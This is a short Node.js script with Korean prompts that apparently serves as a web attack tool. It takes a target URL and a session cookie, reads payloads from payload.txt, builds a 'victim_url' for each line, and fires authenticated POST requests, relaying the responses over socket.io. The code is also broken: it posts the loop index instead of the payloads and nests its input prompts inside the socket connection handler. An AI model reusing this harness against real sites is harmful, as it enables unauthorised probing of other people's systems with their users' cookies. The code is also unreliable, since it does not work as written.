const fs = require('fs');
const readline = require('readline');
const request = require('request');

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

io.on('connection', (socket) => {
    
    console.log('connect');

    const fs = require('fs');
    const readline = require('readline');
    const request = require('request');

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

rl.question("URL을 입력해주세요 : ", (url) => {
    rl.question("쿠키 값을 입력해주세요 : ", (cookie_val) => {
        const array = fs.readFileSync('payload.txt').toString().split("\n");
        for (let i in array) {
            let victim_url = url + array[i];
            console.log(victim_url);
            const options = {
                url: url,
                headers: {
                    'Cookie': cookie_val
                },
                form: {
                    data: i
                }
            };
            request.post(options, function(error, response, body) {
                if (!error && response.statusCode == 200) {
                    console.log(body);
                    io.emit('data', body);
                }
            });
        }
        rl.close();
    });
});
});